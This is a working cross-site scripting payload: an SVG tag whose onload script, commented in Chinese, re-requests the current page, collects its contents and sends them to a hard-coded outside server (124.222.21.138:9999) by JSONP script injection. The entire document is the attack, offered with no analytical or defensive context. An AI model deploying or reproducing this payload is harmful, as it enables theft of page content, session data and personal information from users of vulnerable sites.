<svg/onload="
var pages = [window.location.href];
console.log(pages);
var data = {};
var count = 0;

// 请求每个页面的数据
for (var i = 0; i < pages.length; i++) {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', pages[i], true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      // 将页面数据存储到 data 对象中
      data[pages[i]] = xhr.responseText;
      count++;
      if (count === pages.length) {
        // 所有页面数据请求完毕，发送数据到外部 URL
	console.log(data);
        sendData(data);
      }
    }
  };
  xhr.send();
}

// 发送数据到外部 URL
function sendData(data) {
var callbackName = 'handleData' + new Date().getTime();
var url = 'http://124.222.21.138:9999/callback.php?callback=' + callbackName + '&data=' + encodeURIComponent(JSON.stringify(data));

var script = document.createElement('script');
script.src = url;
document.body.appendChild(script);

window[callbackName] = function(response) {
var decodedResponse = decodeURIComponent(escape(response));
console.log(decodedResponse);
delete window[callbackName];
};
}
">
